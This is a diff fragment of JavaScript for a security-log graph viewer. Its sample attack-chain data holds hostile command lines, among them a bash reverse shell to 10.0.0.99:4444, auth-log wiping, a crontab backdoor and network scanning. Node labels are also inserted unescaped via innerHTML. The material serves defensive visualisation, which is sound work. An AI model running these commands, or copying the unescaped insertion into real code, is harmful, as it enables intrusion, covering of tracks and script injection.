+function toggleLabels() { gSel && gSel.selectAll('.nlabel').style('display', document.getElementById('chk-labels').checked ? '' : 'none'); }
+function toggleWeights() { gSel && gSel.selectAll('.wlabels').style('display', document.getElementById('chk-weights').checked ? '' : 'none'); }
+
+function toggleSev(sev) {
+  const el = document.querySelector(`.legend-row[data-sev="${sev}"]`);
+  if (hiddenSev.has(sev)) { hiddenSev.delete(sev); el.classList.remove('muted'); }
+  else { hiddenSev.add(sev); el.classList.add('muted'); }
+  applySevFilter();
+}
+
+function applySevFilter() {
+  if (!gSel) return;
+  gSel.selectAll('.node').style('display', d => hiddenSev.has(d.level||'unknown') ? 'none' : '');
+  const hiddenIds = new Set((graphData?.nodes||[]).filter(n => hiddenSev.has(n.level||'unknown')).map(n => n.id));
+  gSel.selectAll('.links path').style('display', e => {
+    const s = typeof e.source==='object' ? e.source.id : e.source;
+    const t = typeof e.target==='object' ? e.target.id : e.target;
+    return hiddenIds.has(s) || hiddenIds.has(t) ? 'none' : '';
+  });
+}
+
+function filterNodes() {
+  const q = document.getElementById('search-box').value.toLowerCase();
+  document.querySelectorAll('.node-item').forEach(el => {
+    el.style.display = el.dataset.label.toLowerCase().includes(q) ? '' : 'none';
+  });
+  if (!gSel) return;
+  if (!q) { gSel.selectAll('.node').attr('opacity', 1); return; }
+  gSel.selectAll('.node').attr('opacity', d => (d.label||d.id).toLowerCase().includes(q) ? 1 : 0.15);
+}
+
+// ── Zoom ──
+function zoomIn()  { svgSel.transition().call(zoomB.scaleBy, 1.3); }
+function zoomOut() { svgSel.transition().call(zoomB.scaleBy, 0.77); }
+function fitView() {
+  if (!graphData || !graphData.nodes.length) return;
+  const ns = graphData.nodes;
+  const xs = ns.map(n => n.x||0), ys = ns.map(n => n.y||0);
+  const x0=Math.min(...xs), x1=Math.max(...xs), y0=Math.min(...ys), y1=Math.max(...ys);
+  const area = document.getElementById('canvas-area');
+  const W = area.clientWidth, H = area.clientHeight;
+  const scale = Math.min(0.85*(W-80)/(x1-x0||1), 0.85*(H-80)/(y1-y0||1), 2);
+  const tx = W/2 - (x0+x1)/2*scale, ty = H/2 - (y0+y1)/2*scale;
+  svgSel.transition().duration(500).call(zoomB.transform, d3.zoomIdentity.translate(tx, ty).scale(scale));
+}
+
+function toggleFreeze() {
+  frozen = !frozen;
+  document.getElementById('btn-freeze').classList.toggle('active', frozen);
+  if (frozen && sim) sim.stop();
+  else if (!frozen && sim) sim.alpha(.1).restart();
+  showToast(frozen ? 'Layout frozen' : 'Layout resumed');
+}
+
+// ── Stats ──
+function updateStats(data) {
+  document.getElementById('s-nodes').textContent = data.nodes.length;
+  document.getElementById('s-edges').textContent = data.edges.length;
+  document.getElementById('s-crit').textContent  = data.nodes.filter(n => n.level==='critical').length;
+  document.getElementById('s-high').textContent  = data.nodes.filter(n => n.level==='high').length;
+  document.getElementById('sum-nodes').textContent = data.nodes.length;
+  document.getElementById('sum-edges').textContent = data.edges.length;
+  const ts = data.nodes.map(n => n.timestamp).filter(Boolean).sort();
+  document.getElementById('sum-first').textContent = ts[0] ? ts[0].slice(0,16) : '—';
+  document.getElementById('sum-last').textContent  = ts.at(-1) ? ts.at(-1).slice(0,16) : '—';
+  ['critical','high','medium','low','unknown'].forEach(s => {
+    document.getElementById('cnt-'+s).textContent = data.nodes.filter(n => (n.level||'unknown')===s).length;
+  });
+}
+
+// ── Node list ──
+function buildNodeList(data) {
+  const list = document.getElementById('node-list');
+  list.innerHTML = '';
+  const order = { critical:0, high:1, medium:2, low:3, unknown:4 };
+  const sorted = [...data.nodes].sort((a,b) => (order[a.level]||4) - (order[b.level]||4));
+  sorted.forEach(n => {
+    const div = document.createElement('div');
+    div.className = 'node-item';
+    div.dataset.id = n.id;
+    div.dataset.label = n.label || n.id;
+    div.innerHTML = `
+      <div class="node-name">${n.label||n.id}</div>
+      <div class="node-meta">
+        <span class="sev-pill sev-${n.level||'unknown'}">${n.level||'unknown'}</span>
+        <span class="node-cnt">${n.count||1} logs</span>
+      </div>`;
+    div.onclick = () => window._selectById && window._selectById(n.id);
+    list.appendChild(div);
+  });
+}
+
+// ── File load ──
+document.getElementById('file-input').addEventListener('change', e => {
+  const f = e.target.files[0]; if (!f) return;
+  const r = new FileReader();
+  r.onload = ev => {
+    try {
+      const d = parseGraphML(ev.target.result);
+      if (!d.nodes.length) { showToast('No nodes found in file'); return; }
+      renderGraph(d);
+      showToast(`Loaded: ${d.nodes.length} nodes, ${d.edges.length} edges`);
+    } catch(err) { showToast('Error parsing file: ' + err.message); }
+  };
+  r.readAsText(f);
+  e.target.value = '';
+});
+
+const ua = document.getElementById('upload-area');
+document.addEventListener('dragover', e => { e.preventDefault(); ua.classList.add('drag-over'); });
+document.addEventListener('dragleave', () => ua.classList.remove('drag-over'));
+document.addEventListener('drop', e => {
+  e.preventDefault(); ua.classList.remove('drag-over');
+  const f = e.dataTransfer.files[0]; if (!f) return;
+  const r = new FileReader();
+  r.onload = ev => {
+    try { const d = parseGraphML(ev.target.result); renderGraph(d); showToast(`Loaded: ${d.nodes.length} nodes`); }
+    catch(err) { showToast('Error: ' + err.message); }
+  };
+  r.readAsText(f);
+});
+
+// ── Export ──
+function exportSVG() {
+  if (!graphData) { showToast('No graph loaded'); return; }
+  const s = document.getElementById('graph-svg').cloneNode(true);
+  s.setAttribute('xmlns','http://www.w3.org/2000/svg');
+  const blob = new Blob([s.outerHTML], { type:'image/svg+xml' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'recongraph.svg'; a.click();
+  showToast('SVG exported');
+}
+function exportJSON() {
+  if (!graphData) { showToast('No graph loaded'); return; }
+  const out = {
+    nodes: graphData.nodes.map(n => ({ id:n.id, label:n.label, level:n.level, count:n.count, timestamp:n.timestamp })),
+    edges: graphData.edges.map(e => ({ source: typeof e.source==='object'?e.source.id:e.source, target: typeof e.target==='object'?e.target.id:e.target, weight:e.weight }))
+  };
+  const blob = new Blob([JSON.stringify(out,null,2)], { type:'application/json' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'recongraph.json'; a.click();
+  showToast('JSON exported');
+}
+
+// ── Toast ──
+let toastT;
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg; t.classList.add('show');
+  clearTimeout(toastT); toastT = setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+// ── Sample graph ──
+function loadSample() {
+  const xml = `<?xml version="1.0" encoding="UTF-8"?>
+<graphml xmlns="http://graphml.graphdrawing.org/graphml">
+  <key id="k0" for="node" attr.name="label" attr.type="string"/>
+  <key id="k1" for="node" attr.name="level" attr.type="string"/>
+  <key id="k2" for="node" attr.name="count" attr.type="int"/>
+  <key id="k3" for="node" attr.name="timestamp" attr.type="string"/>
+  <key id="k4" for="node" attr.name="snippet" attr.type="string"/>
+  <key id="k5" for="edge" attr.name="weight" attr.type="double"/>
+  <graph id="G" edgedefault="directed">
+    <node id="n0"><data key="k0">SSH Brute Force Attempt</data><data key="k1">high</data><data key="k2">47</data><data key="k3">2024-03-15 02:14:33</data><data key="k4">Failed password for root from 192.168.1.105 port 54321 ssh2</data></node>
+    <node id="n1"><data key="k0">Successful SSH Login</data><data key="k1">medium</data><data key="k2">3</data><data key="k3">2024-03-15 02:31:07</data><data key="k4">Accepted publickey for ubuntu from 192.168.1.105</data></node>
+    <node id="n2"><data key="k0">Sudo Privilege Escalation</data><data key="k1">critical</data><data key="k2">5</data><data key="k3">2024-03-15 02:32:14</data><data key="k4">ubuntu: TTY=pts/0 PWD=/home/ubuntu USER=root COMMAND=/bin/bash</data></node>
+    <node id="n3"><data key="k0">Outbound Data Transfer</data><data key="k1">critical</data><data key="k2">2</data><data key="k3">2024-03-15 02:45:00</data><data key="k4">outbound connection to 10.0.0.99:4444 detected</data></node>
+    <node id="n4"><data key="k0">Cron Job Modified</data><data key="k1">high</data><data key="k2">1</data><data key="k3">2024-03-15 02:50:10</data><data key="k4">/etc/crontab modified - added backdoor.sh</data></node>
+    <node id="n5"><data key="k0">Reverse Shell Spawn</data><data key="k1">high</data><data key="k2">8</data><data key="k3">2024-03-15 02:33:55</data><data key="k4">bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444 0&gt;&amp;1</data></node>
+    <node id="n6"><data key="k0">File System Enumeration</data><data key="k1">medium</data><data key="k2">14</data><data key="k3">2024-03-15 02:34:10</data><data key="k4">find / -name "*.conf" -readable 2&gt;/dev/null</data></node>
+    <node id="n7"><data key="k0">Log File Cleared</data><data key="k1">critical</data><data key="k2">3</data><data key="k3">2024-03-15 02:52:00</data><data key="k4">echo "" &gt; /var/log/auth.log</data></node>
+    <node id="n8"><data key="k0">Web Shell Upload</data><data key="k1">critical</data><data key="k2">1</data><data key="k3">2024-03-15 01:58:22</data><data key="k4">POST /upload.php - cmd.php uploaded</data></node>
+    <node id="n9"><data key="k0">Normal Web Request</data><data key="k1">low</data><data key="k2">312</data><data key="k3">2024-03-15 01:55:00</data><data key="k4">GET /index.php HTTP/1.1 200</data></node>
+    <node id="n10"><data key="k0">Tool Installation</data><data key="k1">medium</data><data key="k2">4</data><data key="k3">2024-03-15 02:36:00</data><data key="k4">apt-get install -y netcat nmap</data></node>
+    <node id="n11"><data key="k0">Network Reconnaissance</data><data key="k1">high</data><data key="k2">6</data><data key="k3">2024-03-15 02:38:00</data><data key="k4">nmap -sV -p- 192.168.1.0/24</data></node>
+    <edge id="e0" source="n9" target="n8"><data key="k5">1</data></edge>
+    <edge id="e1" source="n8" target="n0"><data key="k5">1</data></edge>
+    <edge id="e2" source="n0" target="n1"><data key="k5">3</data></edge>
+    <edge id="e3" source="n1" target="n2"><data key="k5">3</data></edge>
+    <edge id="e4" source="n2" target="n5"><data key="k5">5</data></edge>
+    <edge id="e5" source="n2" target="n6"><data key="k5">8</data></edge>
+    <edge id="e6" source="n2" target="n10"><data key="k5">4</data></edge>
+    <edge id="e7" source="n5" target="n3"><data key="k5">2</data></edge>
+    <edge id="e8" source="n6" target="n11"><data key="k5">6</data></edge>
+    <edge id="e9" source="n10" target="n11"><data key="k5">3</data></edge>
+    <edge id="e10" source="n11" target="n3"><data key="k5">2</data></edge>
+    <edge id="e11" source="n3" target="n4"><data key="k5">1</data></edge>
+    <edge id="e12" source="n4" target="n7"><data key="k5">1</data></edge>
+    <edge id="e13" source="n0" target="n0"><data key="k5">44</data></edge>
+  </graph>
+</graphml>`;
+  const d = parseGraphML(xml);
+  renderGraph(d);
+  showToast('Sample graph loaded (Linux server compromise scenario)');
+}
+
+// Init
+initSVG();
+</script>
+</body>
+</html>
